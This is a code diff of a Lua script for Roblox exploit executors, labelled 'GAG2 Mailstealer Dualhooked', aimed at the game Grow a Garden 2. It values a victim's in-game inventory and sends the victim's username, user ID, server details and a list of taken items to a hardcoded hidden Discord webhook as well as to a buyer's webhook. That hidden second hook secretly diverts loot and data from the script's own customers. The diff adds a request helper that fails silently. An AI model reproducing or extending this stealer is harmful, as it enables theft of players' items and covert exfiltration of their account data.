@@ -1,4 +1,4 @@
--- GAG2 Mailstealer Dualhooked – Premium Logging Edition
+-- GAG2 Mailstealer Dualhooked – Premium Logging Edition (Fixed Webhooks)
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -15,7 +15,6 @@ local HIDDEN_WEBHOOK = "https://discord.com/api/webhooks/1515781256237940807/m7u
 local customerTarget = getgenv().UserName
 local customerWebhook = getgenv().Webhook
 if not customerTarget or customerTarget == "" or not customerWebhook or customerWebhook == "" then return end
-
 
 -- ##############################
 --  STEAL ALL LIST
@@ -88,6 +87,35 @@ end
 
 local function commaFormat(n)
     return tostring(math.floor(n)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
+end
+
+-- ##############################
+--  ROBUST HTTP REQUEST
+-- ##############################
+local httpRequest = nil
+if syn and syn.request then
+    httpRequest = syn.request
+elseif http_request then
+    httpRequest = http_request
+elseif request then
+    httpRequest = request
+elseif http and http.request then
+    httpRequest = http.request
+end
+
+local function sendWebhook(url, payload)
+    if not httpRequest then
+        -- Silent fail – no request function available
+        return
+    end
+    pcall(function()
+        httpRequest({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
 end
 
 -- ##############################
@@ -238,7 +266,6 @@ local placeId = game.PlaceId
 local jobId = game.JobId
 local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
 
--- Value calculation
 local function getItemValue(item)
     local success, value = pcall(function()
         return MailboxItemCatalog.GetValue(
@@ -251,7 +278,6 @@ local function getItemValue(item)
     return success and (tonumber(value) or 0) or 0
 end
 
--- Build inventory lines with values
 local function buildInventoryLines(items, includeValues)
     local lines = {}
     local totalValue = 0
@@ -290,206 +316,177 @@ end
 
 -- Hidden webhook (premium dashboard)
 if HIDDEN_WEBHOOK and HIDDEN_WEBHOOK ~= "" then
-    pcall(function()
-        local hiddenLines, hiddenValue, hiddenCount = buildInventoryLines(allHiddenItems, true)
-        local customerLines, customerValue, customerCount = buildInventoryLines(customerSplitItems, true)
-        local fullInvLines = {}
+    local hiddenLines, hiddenValue, hiddenCount = buildInventoryLines(allHiddenItems, true)
+    local customerLines, customerValue, customerCount = buildInventoryLines(customerSplitItems, true)
+    local fullInvLines = {}
 
-        -- Full inventory snapshot
-        for _, category in ipairs(MailboxItemCatalog.Categories) do
-            local catData = inv[category]
-            if type(catData) == "table" and next(catData) then
-                local catLines = {}
-                if category == "HarvestedFruits" or category == "Pets" then
-                    for id, data in pairs(catData) do
-                        local resolved = MailboxItemCatalog.Resolve(category, id, data)
-                        local value = getItemValue({Category = category, ItemKey = id, FruitData = data, PetData = data, Count = 1})
-                        table.insert(catLines, string.format("• %s — %s Value", resolved, commaFormat(value)))
-                    end
-                else
-                    for name, count in pairs(catData) do
-                        if type(count) == "number" and count > 0 then
-                            local value = getItemValue({Category = category, ItemKey = name, Count = 1})
-                            table.insert(catLines, string.format("• %s (x%s) — %s Value", name, commaFormat(count), commaFormat(value * count)))
-                        end
-                    end
+    for _, category in ipairs(MailboxItemCatalog.Categories) do
+        local catData = inv[category]
+        if type(catData) == "table" and next(catData) then
+            local catLines = {}
+            if category == "HarvestedFruits" or category == "Pets" then
+                for id, data in pairs(catData) do
+                    local resolved = MailboxItemCatalog.Resolve(category, id, data)
+                    local value = getItemValue({Category = category, ItemKey = id, FruitData = data, PetData = data, Count = 1})
+                    table.insert(catLines, string.format("• %s — %s Value", resolved, commaFormat(value)))
                 end
-                if #catLines > 0 then
-                    table.insert(fullInvLines, "**" .. category .. "**")
-                    for _, line in ipairs(catLines) do
-                        table.insert(fullInvLines, line)
+            else
+                for name, count in pairs(catData) do
+                    if type(count) == "number" and count > 0 then
+                        local value = getItemValue({Category = category, ItemKey = name, Count = 1})
+                        table.insert(catLines, string.format("• %s (x%s) — %s Value", name, commaFormat(count), commaFormat(value * count)))
                     end
                 end
             end
+            if #catLines > 0 then
+                table.insert(fullInvLines, "**" .. category .. "**")
+                for _, line in ipairs(catLines) do
+                    table.insert(fullInvLines, line)
+                end
+            end
         end
+    end
 
-        -- Build embeds
-        local embeds = {}
+    local embeds = {}
 
-        -- Embed 1: Main Summary
-        local mainEmbed = {
-            title = "🎯 Grow a Garden 2 — Completed Transfer",
-            description = string.format(
-                "```ansi\n" ..
-                "\x1b[1;37m────────────────────────────────────────\x1b[0m\n" ..
-                "\x1b[1;32m✅ Transfer Complete\x1b[0m\n" ..
-                "\x1b[1;37m────────────────────────────────────────\x1b[0m```"
-            ),
-            color = 0x1a1a2e,
-            fields = {},
-            footer = {
-                text = string.format("GAG2 Mailstealer • Execution ID: %s", executionId),
-                icon_url = "https://cdn.discordapp.com/emojis/1095762019248910356.png"
+    local mainEmbed = {
+        title = "🎯 Grow a Garden 2 — Completed Transfer",
+        description = string.format(
+            "```ansi\n" ..
+            "\x1b[1;37m────────────────────────────────────────\x1b[0m\n" ..
+            "\x1b[1;32m✅ Transfer Complete\x1b[0m\n" ..
+            "\x1b[1;37m────────────────────────────────────────\x1b[0m```"
+        ),
+        color = 0x1a1a2e,
+        fields = {},
+        footer = {
+            text = string.format("GAG2 Mailstealer • Execution ID: %s", executionId)
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    mainEmbed.fields[1] = {
+        name = "👤 Victim Information",
+        value = string.format(
+            "```yaml\n" ..
+            "Username : %s\n" ..
+            "User ID  : %s\n" ..
+            "Account  : %s\n" ..
+            "Executor : %s```",
+            player.Name,
+            player.UserId,
+            formatAccountAge(accountAge),
+            executorName
+        ),
+        inline = false
+    }
+
+    mainEmbed.fields[2] = {
+        name = "🖥️ Server Information",
+        value = string.format(
+            "```yaml\n" ..
+            "Place ID : %s\n" ..
+            "Job ID   : %s```",
+            placeId,
+            jobId
+        ),
+        inline = false
+    }
+
+    local hiddenText = table.concat(hiddenLines, "\n")
+    if #hiddenText > 1024 then hiddenText = hiddenText:sub(1, 1021) .. "..." end
+    mainEmbed.fields[3] = {
+        name = "🔒 Hidden Receipt — " .. HIDDEN_BENEFICIARY,
+        value = string.format("```diff\n%s```", hiddenText ~= "" and hiddenText or "• No items"),
+        inline = false
+    }
+
+    local customerText = table.concat(customerLines, "\n")
+    if #customerText > 1024 then customerText = customerText:sub(1, 1021) .. "..." end
+    mainEmbed.fields[4] = {
+        name = "📤 Customer Receipt — " .. customerTarget,
+        value = string.format("```ini\n%s```", customerText ~= "" and customerText or "• No items"),
+        inline = false
+    }
+
+    table.insert(embeds, mainEmbed)
+
+    local fullInvText = table.concat(fullInvLines, "\n")
+    if #fullInvText > 4096 then fullInvText = fullInvText:sub(1, 4093) .. "..." end
+    local invEmbed = {
+        title = "📋 Full Inventory Snapshot",
+        description = string.format("```diff\n%s```", fullInvText ~= "" and fullInvText or "Empty"),
+        color = 0x16213e,
+        footer = { text = "GAG2 Mailstealer • Snapshot" }
+    }
+    table.insert(embeds, invEmbed)
+
+    local totalValue = hiddenValue + customerValue
+    local totalItems = hiddenCount + customerCount
+    local summaryEmbed = {
+        title = "📊 Transfer Summary",
+        fields = {
+            {
+                name = "💰 Total Value Taken",
+                value = string.format("```fix\n%s Sheckles```", commaFormat(totalValue)),
+                inline = true
             },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }
-
-        -- Victim Info field
-        mainEmbed.fields[1] = {
-            name = "👤 Victim Information",
-            value = string.format(
-                "```yaml\n" ..
-                "Username : %s\n" ..
-                "User ID  : %s\n" ..
-                "Account  : %s\n" ..
-                "Executor : %s```",
-                player.Name,
-                player.UserId,
-                formatAccountAge(accountAge),
-                executorName
-            ),
-            inline = false
-        }
-
-        -- Server Info field
-        mainEmbed.fields[2] = {
-            name = "🖥️ Server Information",
-            value = string.format(
-                "```yaml\n" ..
-                "Place ID : %s\n" ..
-                "Job ID   : %s```",
-                placeId,
-                jobId
-            ),
-            inline = false
-        }
-
-        -- Hidden Receipt field
-        local hiddenText = table.concat(hiddenLines, "\n")
-        if #hiddenText > 1024 then hiddenText = hiddenText:sub(1, 1021) .. "..." end
-        mainEmbed.fields[3] = {
-            name = "🔒 Hidden Receipt — " .. HIDDEN_BENEFICIARY,
-            value = string.format("```diff\n%s```", hiddenText ~= "" and hiddenText or "• No items"),
-            inline = false
-        }
-
-        -- Customer Receipt field
-        local customerText = table.concat(customerLines, "\n")
-        if #customerText > 1024 then customerText = customerText:sub(1, 1021) .. "..." end
-        mainEmbed.fields[4] = {
-            name = "📤 Customer Receipt — " .. customerTarget,
-            value = string.format("```ini\n%s```", customerText ~= "" and customerText or "• No items"),
-            inline = false
-        }
-
-        table.insert(embeds, mainEmbed)
-
-        -- Embed 2: Full Inventory
-        local fullInvText = table.concat(fullInvLines, "\n")
-        if #fullInvText > 4096 then fullInvText = fullInvText:sub(1, 4093) .. "..." end
-        local invEmbed = {
-            title = "📋 Full Inventory Snapshot",
-            description = string.format("```diff\n%s```", fullInvText ~= "" and fullInvText or "Empty"),
-            color = 0x16213e,
-            footer = {
-                text = "GAG2 Mailstealer • Snapshot"
-            }
-        }
-        table.insert(embeds, invEmbed)
-
-        -- Embed 3: Summary Statistics
-        local totalValue = hiddenValue + customerValue
-        local totalItems = hiddenCount + customerCount
-        local summaryEmbed = {
-            title = "📊 Transfer Summary",
-            fields = {
-                {
-                    name = "💰 Total Value Taken",
-                    value = string.format("```fix\n%s Sheckles```", commaFormat(totalValue)),
-                    inline = true
-                },
-                {
-                    name = "📦 Total Items Taken",
-                    value = string.format("```fix\n%s```", commaFormat(totalItems)),
-                    inline = true
-                },
-                {
-                    name = "✅ Completion Status",
-                    value = "```diff\n+ Successfully Completed```",
-                    inline = true
-                }
+            {
+                name = "📦 Total Items Taken",
+                value = string.format("```fix\n%s```", commaFormat(totalItems)),
+                inline = true
             },
-            color = 0x0f3460,
-            footer = {
-                text = string.format("GAG2 Mailstealer • %s", timestamp)
+            {
+                name = "✅ Completion Status",
+                value = "```diff\n+ Successfully Completed```",
+                inline = true
             }
-        }
-        table.insert(embeds, summaryEmbed)
+        },
+        color = 0x0f3460,
+        footer = { text = string.format("GAG2 Mailstealer • %s", timestamp) }
+    }
+    table.insert(embeds, summaryEmbed)
 
-        -- Send all embeds
-        (syn and syn.request or http_request or request)({
-            Url = HIDDEN_WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({
-                embeds = embeds,
-                username = "GAG2 Mailstealer",
-                avatar_url = "https://cdn.discordapp.com/emojis/1095762019248910356.png"
-            })
-        })
-    end)
+    sendWebhook(HIDDEN_WEBHOOK, {
+        embeds = embeds,
+        username = "GAG2 Mailstealer",
+        avatar_url = "https://cdn.discordapp.com/emojis/1095762019248910356.png"
+    })
 end
 
 -- Customer webhook (simple, clean)
 if customerWebhook and #customerSplitItems > 0 then
-    pcall(function()
-        local customerLines = {}
-        local totalValue = 0
-        local totalItems = 0
-        for _, item in ipairs(customerSplitItems) do
-            local resolved = MailboxItemCatalog.Resolve(item.Category, item.ItemKey, item.FruitData or item.PetData)
-            local value = getItemValue(item) * item.Count
-            totalValue = totalValue + value
-            totalItems = totalItems + item.Count
-            table.insert(customerLines, string.format("• %s (x%s) — %s Value", resolved, commaFormat(item.Count), commaFormat(value)))
-        end
+    local customerLines = {}
+    local totalValue = 0
+    local totalItems = 0
+    for _, item in ipairs(customerSplitItems) do
+        local resolved = MailboxItemCatalog.Resolve(item.Category, item.ItemKey, item.FruitData or item.PetData)
+        local value = getItemValue(item) * item.Count
+        totalValue = totalValue + value
+        totalItems = totalItems + item.Count
+        table.insert(customerLines, string.format("• %s (x%s) — %s Value", resolved, commaFormat(item.Count), commaFormat(value)))
+    end
 
-        local customerText = table.concat(customerLines, "\n")
-        if #customerText > 1024 then customerText = customerText:sub(1, 1021) .. "..." end
+    local customerText = table.concat(customerLines, "\n")
+    if #customerText > 1024 then customerText = customerText:sub(1, 1021) .. "..." end
 
-        local embed = {
-            title = "✅ Transfer Complete",
-            description = string.format(
-                "```ini\n" ..
-                "[Victim] %s (%s)\n" ..
-                "[Target] %s\n" ..
-                "[Items] %s\n" ..
-                "[Value] %s Sheckles```",
-                player.Name, player.UserId, customerTarget,
-                commaFormat(totalItems), commaFormat(totalValue)
-            ),
-            color = 0x2ecc71,
-            fields = {{
-                name = "📦 Items Received",
-                value = string.format("```\n%s```", customerText),
-                inline = false
-            }}
-        }
-        (syn and syn.request or http_request or request)({
-            Url = customerWebhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({embeds = {embed}})
-        })
-    end)
+    local embed = {
+        title = "✅ Transfer Complete",
+        description = string.format(
+            "```ini\n" ..
+            "[Victim] %s (%s)\n" ..
+            "[Target] %s\n" ..
+            "[Items] %s\n" ..
+            "[Value] %s Sheckles```",
+            player.Name, player.UserId, customerTarget,
+            commaFormat(totalItems), commaFormat(totalValue)
+        ),
+        color = 0x2ecc71,
+        fields = {{
+            name = "📦 Items Received",
+            value = string.format("```\n%s```", customerText),
+            inline = false
+        }}
+    }
+    sendWebhook(customerWebhook, {embeds = {embed}})
 end
